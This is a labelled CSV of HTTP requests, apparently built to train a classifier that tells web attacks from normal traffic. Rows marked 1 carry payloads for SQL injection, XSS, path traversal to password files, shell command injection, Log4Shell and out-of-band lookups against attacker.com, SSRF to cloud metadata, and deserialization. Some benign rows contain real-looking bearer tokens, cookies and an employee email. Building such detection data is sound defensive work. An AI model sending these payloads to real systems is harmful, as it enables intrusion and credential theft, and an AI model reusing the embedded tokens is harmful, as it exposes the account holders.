method,path,query,headers,body,ua,label
POST,/search,q=phone,Host: example.com; Accept: */*,username=user70&password=pass640,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
POST,/cart/add,product_id=99,Content-Type: application/json,,,0
PUT,/wms/partners/api/v1/service-staff/inventory-movement/api/v1/staffs/019c50a0-e65d-732e-8e22-d55933f6f563,,Accept-Encoding: gzip; Content-Length: 199; Content-Type: application/json; Host: backend-wms.vnpay.vn; User-Agent: Go-http-client/1.1; X-Request-Checksum: 3b86ebf0837355af87cdfa8147128372962edc0c4bc29d357d4c893b0e884f78; X-Request-Client-Id: service-staff; X-Request-Timestamp: 1770910706,,Go-http-client/1.1,0
GET,/LoadFrame,frame_name=x&src=x&single_signout=x%27%3E%3C/iframe%3E%3Cscript%3Ealert(1)%3C/script%3E,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Safari/605.1.15",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Safari/605.1.15",1
POST,/login,,Content-Type: application/x-www-form-urlencoded,user=test&pass=test,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: ../../../../etc/passwd",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: %0d%0aBcc: victim@example.com",,,1
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: id=1' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'A%')--",,,1
POST,/web-api/orders/260209PPXHFATVP/paymentUrl,,"Accept: */*; Accept-Encoding: gzip, deflate, br; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjA3Nzg2OTE0NDYiLCJzY2hhbm5lbCI6IldFQlNJVEUiLCJ1c2VyLWlkIjoiNjc4NTE1OGQtNDI4ZC00YjBiLTg4Y2YtZjc0NjEzYjJlOWRjIiwidXNlcm5hbWUiOiJXRUJTSVRFQDA3Nzg2OTE0NDYiLCJzdWIiOiJXRUJTSVRFQDA3Nzg2OTE0NDYiLCJpYXQiOjE3NzA2MzAzNzAsImV4cCI6MTc3MTIzNTE3MH0.LXAi6ppS2b9WRw1ZiTON43T0fNm_SQh_WSx_L2r_UbE; Connection: keep-alive; Content-Length: 2; Content-Type: application/json; Host: webapi-load.poc.vnshop.cloud; User-Agent: python-requests/2.32.5; X-Request-Id: 35d7503b-4586-4a9f-bdb7-74a3d05cf5c6",,python-requests/2.32.5,0
DELETE,/index.php,,Host: example.com; Accept: */*,input=&& whoami,Nmap Scripting Engine,1
GET,/help/kb/search,query=how+to+reset+password,Authorization: Bearer token123,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: ${jndi:ldap://attacker.com/a}",,,1
POST,/user/ui/theme,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
GET,/index.php,q=' OR 1=1--,Host: example.com; Accept: */*,,sqlmap/1.5.2,1
GET,/search,q=1+1=2,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
POST,/,,Authorization: Bearer token123,"{""id"": {""$bitsAllSet"": [1, 5]}}",,1
GET,/ACSServer/DownloadFileServlet,show_file_name=../../../../../../windows/win.ini&type=uploadfile&path=anything,Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 whid/hou2 macaddress/7cd30a7c7ccf,,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 whid/hou2 macaddress/7cd30a7c7ccf,1
GET,/,,Authorization: Bearer token123; Payload: Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: javascript:alert(1)",,,1
GET,/_next/static/chunks/2881.6ad5a23473c919ef.js,,"Accept: */*; Accept-Encoding: gzip, deflate, br, zstd; Accept-Language: en,vi-vn;q=0.9,vi-VN;q=0.8,vi;q=0.7,en-US;q=0.6; Cache-Control: no-cache; Connection: keep-alive; Cookie: _tt_enable_cookie=1; _ttp=01JW6T7FZKFFRT7J0606NY4ZES_.tt.1; _ga=GA1.1.1350035507.1748280523; _ga_R3RPGF5B39=GS2.1.s1748280523$o1$g1$t1748280667$j0$l0$h0; _gcl_au=1.1.253122252.1770895125; _fbp=fb.1.1770895126968.700988267219918436; _ga_1XRVJ9DDS6=GS2.1.s1771387924$o7$g0$t1771387924$j60$l0$h0; ttcsid_CQNEHUJC77UD2I8MDM90=1771387925137::UiISlEEgFJuiuvsM3day.7.1771388163619.1; ttcsid_CQQA2PJC77U11VCBE7G0=1771387925150::oX6ZPKAEr-FL42VdJ_3S.6.1771388163624.1; ttcsid=1771387925139::1m5g6QL8MThke27ko4uP.7.1771388163624.0; Host: sacombankpay.vnshop.vn; Pragma: no-cache; Referer: https://sacombankpay.vnshop.vn/search?suggestion=D%E1%BA%A7u%20g%E1%BB%99i%20S%E1%BA%A1ch%20g%C3%A0u%20Clear%20Hoa%20Anh%20%C4%90%C3%A0o%20B%C4%83ng%20L%E1%BA%A1nh%20630g; Sec-Ch-Ua: ""Not(A:Brand"";v=""8"", ""Chromium"";v=""144"", ""Android WebView"";v=""144""; Sec-Ch-Ua-Mobile: ?1; Sec-Ch-Ua-Platform: ""Android""; Sec-Fetch-Dest: script; Sec-Fetch-Mode: no-cors; Sec-Fetch-Site: same-origin; User-Agent: Dalvik/2.1.0 (Linux; U; Android 14; SM-A235F Build/UP1A.231005.007); X-Requested-With: com.sacombank.ewallet",,Dalvik/2.1.0 (Linux; U; Android 14; SM-A235F Build/UP1A.231005.007),0
DELETE,/admin,,Host: example.com; Accept: */*,input=<img src=x onerror=alert(1)>,Nmap Scripting Engine,1
GET,/,,Content-Type: application/json; Payload: id=1' OR '1'='1,,,1
POST,/api/v1/projects,,Authorization: Bearer token123,,,0
POST,/login,,Content-Type: application/x-www-form-urlencoded,user=test&pass=test,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
POST,/index.php,,Host: example.com; Accept: */*,input=; ls -la,curl/7.68.0,1
PUT,/search,,Host: example.com; Accept: */*,input=&& whoami,sqlmap/1.5.2,1
POST,/api/v1/orders,,Host: example.com; Accept: */*,username=user582&password=pass668,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
POST,/login,,Content-Type: application/x-www-form-urlencoded,user=test&pass=test,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
PUT,/api/v1/users,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/assets/js/bundle.min.js,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
GET,/wp-content/plugins/mdc-youtube-downloader/includes/download.php,file=/etc/passwd,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0 maglev/24074.2320.2799.6852/49",,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0 maglev/24074.2320.2799.6852/49",1
GET,/api/v1/tasks/rep_99/status,,Authorization: Bearer token123,,,0
GET,/web-api/orders/b45df91c-d959-4743-a2b2-f32992568715,,"Accept: */*; Accept-Encoding: gzip, deflate, br; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjA3NzIxMjIzODIiLCJzY2hhbm5lbCI6IldFQlNJVEUiLCJ1c2VyLWlkIjoiZWUzZjFjNzYtNzU0MC00NGY3LWI0OTYtNWMyMjIwZDBlNDdhIiwidXNlcm5hbWUiOiJXRUJTSVRFQDA3NzIxMjIzODIiLCJzdWIiOiJXRUJTSVRFQDA3NzIxMjIzODIiLCJpYXQiOjE3NzA2MzAyMzIsImV4cCI6MTc3MTIzNTAzMn0.s_UcZ1DEKibqpxujaoZsI3KPWozWoNmJxx2ISU0II0g; Connection: keep-alive; Content-Type: application/json; Host: webapi-load.poc.vnshop.cloud; User-Agent: python-requests/2.32.5; X-Request-Id: 675d42ad-4eb4-4f9b-922c-ed1f993bd311",,python-requests/2.32.5,0
POST,/index.php,,Host: example.com; Accept: */*,input=http://127.0.0.1:8080/admin,sqlmap/1.5.2,1
POST,/auth/password-reset-request,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
GET,/,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/search,q=laptop,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
POST,/test-framework-api/node/node/sys-task/053cb910-a251-4683-883e-4d42ae1389c8/next-message/1770690704,,"Accept-Encoding: gzip, x-gzip, deflate; Authorization: Bearer eyJraWQiOiJMbHFRYVBsYXRmb3JtIiwiYWxnIjoiUlMyNTYifQ.eyJpc3MiOiJMbHFRYVBsYXRmb3JtIiwianRpIjoiNDRlM2FkNDAtZjk3MS00ZTIyLWExNzEtN2ZjZjdmYjZjMjg4Iiwic3ViIjoibGluaG5kMkB2bnBheS52biIsImVtYWlsIjoibGluaG5kMkB2bnBheS52biIsInRva2VuVHlwZSI6Ik5PREUifQ.DtYHgQvhdbidHrh2NhfmxUwW4U4FwTA9gA2XmRtCXOFmF7ml_cA7wRFQCcOzYBVmJs-OJZ5zLAnDXeOboK81N42VpuWCZOSob4EEO41x-lKqXweGduTAAwsHm4ZhQ73ms4_a0xD6hL11hX55vxoSGyz1NY45yFcDBr18D-8k9dJTEMkuzlZG16WdP7xJ61CYg9XaekXAmiatkSEs8GjzT7lVGF7Ls87Nbi6FkkHt-tr2o77uiGqfKqxNTRyJovNGYqjKk6gN3MCc1o-Qo9e2FotfSxWp3Bz8rERYNoE-JborCLv6Fjj-pHC1Spzadj5wwWbV12_NnlSVYyaT-_lKQg; Cache-Control: no-cache; Connection: keep-alive; Content-Length: 0; Cookie: __Host-grv_app_session_subject=f0bb13ae464b39453391cb6dc0d4e1e62eeb8857b39548344a1b93a559d46740; __Host-grv_app_session=67a4d64fcf1b4d31f0af98d4b868ef5528a1bb9f44dfc6f98df7751a6d938386; Host: lqa.vnpaytest.vn; Node-Version: v1.0.0; User-Agent: Apache-HttpClient/5.4.1 (Java/17.0.4.1); X-Request-Id: 53e7e475-1f82-4052-915f-bea66e88316f",,Apache-HttpClient/5.4.1 (Java/17.0.4.1),0
GET,/,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/assets/js/bundle.min.js,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
POST,/search,q=phone,Host: example.com; Accept: */*,username=user948&password=pass776,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
POST,/contact,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
GET,/,,Content-Type: application/json; Payload: PATCH /api/v1/settings/theme,,,0
POST,/checkout,,Host: example.com; Accept: */*,username=user478&password=pass512,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
POST,/legal/tos/accept,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
DELETE,/search,,Host: example.com; Accept: */*,input=admin'--,sqlmap/1.5.2,1
GET,/locales/vi-VN.json,,Authorization: Bearer token123,,,0
POST,/api/v1/posts/55/comments,,Content-Type: application/json,,,0
POST,/api/v1/payment/tokens,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: //////////////////etc/passwd",,,1
PUT,/api/v1/users,,Host: example.com; Accept: */*,input=http://169.254.169.254/latest/meta-data,sqlmap/1.5.2,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: ..\..\..\..\windows\system32\config\sam",,,1
POST,/graphql,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
GET,/api/v1/search/suggest,q=secur,Authorization: Bearer token123,,,0
DELETE,/api/v1/users,,Host: example.com; Accept: */*,input=; ls -la,Nmap Scripting Engine,1
PUT,/admin,,Host: example.com; Accept: */*,input=http://169.254.169.254/latest/meta-data,sqlmap/1.5.2,1
POST,/login,,Content-Type: application/x-www-form-urlencoded,user=test&pass=test,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: ../../../../etc/passwd%00",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: id=1 AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\a')))",,,1
GET,/,,Content-Type: application/json; Payload: X-Forwarded-Host: attacker.com,,,1
POST,/,,Authorization: Bearer token123,"{""alg"":""RS256"",""jku"":""http://attacker.com/key.json""}",,1
POST,/home,,Host: example.com; Accept: */*,username=user493&password=pass347,Mozilla/5.0 (Linux; Android 11),0
GET,/favicon.ico,,,,,0
GET,/robots.txt,,Authorization: Bearer token123,,,0
POST,/api/v1/orders,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
GET,/cw9300-010-misc-tui-the-thao--s241204757,,"Accept: */*; Accept-Encoding: gzip, deflate, br; From: bingbot(at)microsoft.com; Host: bidvmb.vnshop.vn; User-Agent: Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36",,"Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36",0
POST,/,,Content-Type: application/json,"{""alg"":""none""}",,1
DELETE,/api/v1/cart/items/5,,Authorization: Bearer token123,,,0
PUT,/index.php,,Host: example.com; Accept: */*,input=<script>alert(1)</script>,sqlmap/1.5.2,1
POST,/auth/password-reset-request,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
GET,/,,"Authorization: Bearer token123; Payload: <iframe srcdoc=""<script>alert(1)</script>"">",,,1
POST,/login,,Content-Type: application/x-www-form-urlencoded,user=test&pass=test,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/search,q=laptop,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/admin/reports/sales.csv,year=2025,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
PUT,/api/v1/user/settings,,Authorization: Bearer token123,,,0
PUT,/index.php,,Host: example.com; Accept: */*,input=../../../../etc/passwd,curl/7.68.0,1
GET,/products,category=electronics&brand=apple,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
PUT,/api/v1/users,,Host: example.com; Accept: */*,"input=' UNION SELECT NULL,NULL--",Nmap Scripting Engine,1
POST,/login,,Content-Type: application/x-www-form-urlencoded,user=test&pass=test,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/assets/js/bundle.min.js,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
GET,/,"#set($str=$class.inspect(""java.lang.Runtime"").type.getRuntime().exec(""id""))","User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,1
GET,/config/app-settings.json,,Content-Type: application/json,,,0
DELETE,/blog/article-1,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/search,q=security,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: %0d%0aBcc: victim@example.com",,,1
GET,/,,Authorization: Bearer token123; Payload: User-Agent: ' OR SLEEP(5) OR ',,,1
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: <a href=""http://malicious.com"" target=""_blank"">Click here</a>",,,1
POST,/wishlist/add,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
GET,/search,q=laptop,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
POST,/api/v1/orders,,Host: example.com; Accept: */*,username=user993&password=pass495,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
DELETE,/home,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: dict://localhost:11211/stat",,,1
POST,/user/password-update,,Content-Type: application/json,,,0
PUT,/home,,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/search,q=1+1=2,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
POST,/analytics/metric,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
POST,/newsletter/subscribe,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/,,Content-Type: application/json; Payload: id=1' OR '1'='1,,,1
GET,/,"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\""/+/onmouseover=1/(f=prompt,f(1))//'>","User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,1
GET,/api/v1/products,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/products,category=electronics&brand=apple,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
DELETE,/checkout,,Host: example.com; Accept: */*,,Mozilla/5.0 (Linux; Android 11),0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: cos\nsystem\n(S'id'\ntR.",,,1
POST,/login,,Host: example.com; Accept: */*,username=user361&password=pass460,Mozilla/5.0 (Linux; Android 11),0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: cos\nsystem\n(S'id'\ntR.",,,1
POST,/,,Authorization: Bearer token123,[Binary Frame] 0x89 (Ping),,0
DELETE,/admin,,Host: example.com; Accept: */*,input=admin'--,sqlmap/1.5.2,1
POST,/careers/apply,,Authorization: Bearer token123,,,0
DELETE,/,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
POST,/api/v1/documents,,Content-Type: application/json,,,0
GET,/,,Content-Type: application/json; Payload: id=1' OR '1'='1,,,1
GET,/,,Authorization: Bearer token123; Payload: | id,,,1
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: O:8:""Database"":1:{s:4:""host"";s:9:""localhost"";}",,,1
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: id=1' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'A%')--",,,1
POST,/admin,,Host: example.com; Accept: */*,"input="" onmouseover=alert(1) """,curl/7.68.0,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: ../../../../tmp/shell.php (inside zip archive)",,,1
GET,/favicon.ico,,,,,0
GET,/,,Authorization: Bearer token123; Payload: ${os.system('id')},,,1
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: `uname -a`",,,1
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: ../../../../etc/passwd%00",,,1
GET,/search,q=phone,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Payload: /index.php?name=Guest%0d%0aSet-Cookie: session=1",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36; Payload: ../../../../etc/passwd",,,1
GET,/,,"Authorization: Bearer token123; Payload: id=1 UNION SELECT null, user(), database()--",,,1
GET,/search,q=machine+learning,"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",,,0
GET,/,,Content-Type: application/json; Payload: ..%2f..%2f..%2fetc%2fshadow,,,1
GET,/search,q=laptop,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
DELETE,/cart,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/search,q=laptop,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
POST,/graphql,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,,0
POST,/index.php,,Host: example.com; Accept: */*,input=| cat /etc/passwd,sqlmap/1.5.2,1
